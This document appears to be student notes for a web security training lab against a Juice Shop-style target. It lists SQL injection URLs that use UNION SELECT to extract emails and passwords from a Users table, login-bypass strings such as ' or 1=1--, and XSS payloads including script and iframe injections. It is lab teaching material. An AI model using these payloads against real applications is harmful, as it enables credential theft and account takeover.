# Lab6 - web_applications_security
## Open Firefox browser 
6. 
``` 
http://labs.training.local/rest/products/search?q= 
```
7. 
``` 
http://labs.training.local/rest/products/search?q=test’-- 
```
8. 
``` 
http://labs.training.local/rest/products/search?q=test’)) -- 
```
10. 
``` 
http://labs.training.local/rest/products/search?q=test’)) UNION SELECT * FROM Users --

http://labs.training.local/rest/products/search?q=test')) UNION SELECT '1', '2', '3', '4' FROM Users --
``` 
11. 
``` 
http://labs.training.local/rest/products/search?q=test')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users --
``` 
12. 
``` 
http://labs.training.local/rest/products/search?q=test')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users --
``` 
14. 
```
admin@juice-sh.op'--
```
15.
```
' or 1=1-- 
```

# Útok so zneužitím XSS
4. 
```
<script>alert(`xss`)</script>
```
4/5 
```
<iframe src="javascript:alert(`xss`)">
```
5. 
```
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe> 
```
